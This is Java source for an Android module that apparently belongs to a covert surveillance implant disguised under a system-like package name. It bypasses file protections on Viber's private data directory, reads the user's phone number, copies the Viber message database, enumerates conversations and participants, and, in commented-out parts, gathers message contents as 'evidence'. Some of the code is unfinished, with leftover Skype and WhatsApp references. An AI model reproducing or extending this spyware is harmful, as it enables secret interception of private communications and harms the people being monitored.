package com.android.networking.module.chat;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.StreamCorruptedException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.Semaphore;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.util.Pair;

import com.android.networking.Messages;
import com.android.networking.auto.Cfg;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.db.RecordVisitor;
import com.android.networking.file.Path;
import com.android.networking.util.Check;
import com.android.networking.util.StringUtils;

public class ChatViber extends SubModuleChat {
	private static final String TAG = "ChatViber";

	private static final int PROGRAM = 0x09;
	String pObserving = "viber";

	String dbDir = "/data/data/com.viber.voip/databases";
	String dbFile = "viber_messages";

	private Hashtable<String, Long> lastViber;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	ChatGroups groups = new ChatViberGroups();
	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();

	private String account;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	public String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram() {
		try {
			readViberMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}
	}

	@Override
	protected void start() {
		lastViber = markup.unserialize(new Hashtable<String, Long>());
		try {
			account = readMyPhoneNumber();
			readViberMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastViber: " + lastViber);
		}
	}

	private String readMyPhoneNumber() {
		String number = "";
		String file = "/data/data/com.viber.voip/files/preferences/reg_viber_phone_num";
		
		Path.unprotect(file, 4);
		FileInputStream fileInputStream;
		try {
			fileInputStream = new FileInputStream(file);
			ObjectInputStream oInputStream = new ObjectInputStream(fileInputStream);
			Object one = oInputStream.readObject();
			number = (String) one;
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (StreamCorruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		return number;
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private void readViberMessageHistory() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readViberMessageHistory)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readViberMessageHistory), semaphore red");
			}
			return;
		}
		// f.0=/data/data/com.whatsapp/databases
		// String dbDir = Messages.getString("f_0");
		// f.1=/msgstore.db
		// dbFile = Messages.getString("f_1");
		try {
			boolean updateMarkup = false;
			if (Path.unprotect(dbDir, dbFile, true)) {

				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): can read DB");
				}
				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
				SQLiteDatabase db = helper.getReadableDatabase();

				List<ViberConversation> conversations = getViberConversations(helper, account);
				for (ViberConversation sc : conversations) {
					
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + sc.id + " date: "
								+ sc.date);
					}
					/*
					groups = new ChatViberGroups();

					// retrieves the lastConvId recorded as evidence for this
					// conversation
					long lastConvId = lastViber.containsKey(account + peer) ? lastViber.get(account + peer) : 0;

					if (sc.lastReadIndex > lastConvId) {
						if (groups.isGroup(peer) && !groups.hasMemoizedGroup(peer)) {
							fetchGroup(helper, peer);
						}

						int lastReadId = (int) fetchMessages(helper, sc, lastConvId);
						if (lastReadId > 0) {
							updateMarkupSkype(account + peer, lastReadId, true);
						}

					}*/
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
				}
			}
		} finally {
			readChatSemaphore.release();
		}

	}
	
	/*
	private int fetchMessages(SQLiteDatabase db, String conversation, int lastReadIndex) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		String[] projection = new String[] { "id", "author", "body_xml", "timestamp" };
		String selection = "type == 61 and convo_id = " + conversation.id + " and body_xml != '' and id > " + lastConvId;

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				// I read a line in a conversation.
				int id = cursor.getInt(0);
				String peer = cursor.getString(1);
				String body = cursor.getString(2);
				long timestamp = cursor.getLong(3);
				Date date = new Date(timestamp * 1000L);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) sc.account: " + conversation.account + " conv.remote: " +conversation.remote + " peer: " + peer);
				}
				
				boolean incoming = !(peer.equals(conversation.account));
				boolean isGroup = groups.isGroup(conversation.remote);
				
				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
				}

				String from, to = null;
				String fromDisplay, toDisplay = null;
				
				from = incoming? peer: conversation.account;
				fromDisplay = incoming? conversation.displayname : from;
				
				if (isGroup) {
					to = groups.getGroupTo(peer, conversation.remote);
					toDisplay = to;
				}else{
					to = incoming? conversation.account : conversation.remote;
					toDisplay = incoming? conversation.account : conversation.displayname;
				}



				if (!StringUtils.isEmpty(body)) {
					MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
							body, incoming);

					messages.add(message);
				}

				return id;
			}
		};

		// f_a=messages
		// Messages.getString("i_2")
		long newLastId = helper.traverseRecords(Messages.getString("f_a"), visitor);

		if (messages != null && messages.size() > 0) {
			saveEvidence(messages);
		}

		return newLastId;
	} catch (Exception e) {
		if (Cfg.DEBUG) {
			e.printStackTrace();
			Check.log(TAG + " (fetchMessages) Error: " + e);
		}
		return -1;
	}
	}*/

	private List<ViberConversation> getViberConversations(GenericSqliteHelper helper, final String account) {
		
			final List<ViberConversation> conversations = new ArrayList<ViberConversation>();

			String[] projection = new String[] { "_id", "date" };
			String selection = "date > 0";

			RecordVisitor visitor = new RecordVisitor(projection, selection) {

				@Override
				public long cursor(Cursor cursor) {
					ViberConversation c = new ViberConversation();
					c.account = account;
					c.id = cursor.getInt(0);
					c.date = cursor.getString(1);

					conversations.add(c);
					return c.id;
				}
			};

			helper.traverseRecords("threads", visitor);
			return conversations;
		}
	private void fetchGroup(SQLiteDatabase db, final String conversation) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchGroup) : " + conversation);
		}


		String[] projection = {  "number", "contact_name" };
		String selection = "thread_id" + "='" + conversation + "'";

		// final Set<String> remotes = new HashSet<String>();
		groups.addPeerToGroup(conversation, "-1");
		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				int id = cursor.getInt(0);
				String remote = cursor.getString(1);
				// remotes.add(remote);
				if (remote != null) {
					groups.addPeerToGroup(conversation, remote);
				}
				return id;
			}
		};

		GenericSqliteHelper helper = new GenericSqliteHelper(db);
	
		helper.traverseRecords("participants", visitor);

	}

	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();

		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		queryBuilderIndex.setTables("threads");

		String[] projection = {  "thread_id", "address",	"date", "body", "person" };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext()) {
			// f.5=key_remote_jid
			String jid = cursor.getString(cursor.getColumnIndexOrThrow("thread_id"));
			// f.6=message_table_id
			int mid = cursor.getInt(cursor.getColumnIndexOrThrow("date"));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
			}

			int lastReadIndex = 0;
			// if conversation is known, get the last read index
			if (hastableConversationLastIndex.containsKey(jid)) {

				lastReadIndex = hastableConversationLastIndex.get(jid);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
				}
			}

			// if there's something new, fetch new messages and update
			// markup
			if (lastReadIndex < mid) {
				changedConversations.add(new Pair<String, Integer>(jid, lastReadIndex));
			}

		}
		cursor.close();
		return changedConversations;
	}
}